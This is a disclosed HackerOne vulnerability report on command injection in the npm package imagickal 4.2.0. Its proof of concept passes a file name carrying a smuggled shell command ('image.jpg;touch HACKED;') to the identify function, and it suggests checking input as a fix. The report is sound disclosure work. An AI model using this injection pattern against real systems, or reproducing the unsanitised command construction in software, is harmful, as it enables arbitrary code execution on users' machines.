# [imagickal] Remote Code Execution

## Report Details
- **Report ID**: 973245
- **URL**: https://hackerone.com/reports/973245
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-09-02T15:44:19.192Z
- **Disclosed**: 2021-01-14T08:39:54.544Z

## Reporter
- **Username**: solov9ev
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report `RCE` in `imagickal`
It allows to execute arbitrary commands on the victim's PC

# Module

**module name:** imagickal
**version:** 4.2.0
**npm page:** `https://www.npmjs.com/package/imagickal`

## Module Description

node wrapper for ImageMagick commands

## Module Stats

[42] weekly downloads

# Vulnerability

## Vulnerability Description

Code injection while processing a photo

## Steps To Reproduce:

- Run `npm i imagickal`
- Create and run the following POC index.js:

```javascript
var im = require('imagickal');

im.identify('image.jpg;touch HACKED;').then(function (data) {
  console.log(data);
});
```

- The exploit worked and created the file - `HACKED`

{F973742}

## Patch

Check input before command

# Wrap up

- I contacted the maintainer to let them know: [N]
- I opened an issue in the related repository: [N]

## Impact

Command Injection on `imagickal` module via insecure command

## Attachments
- imagickal_rce.mp4
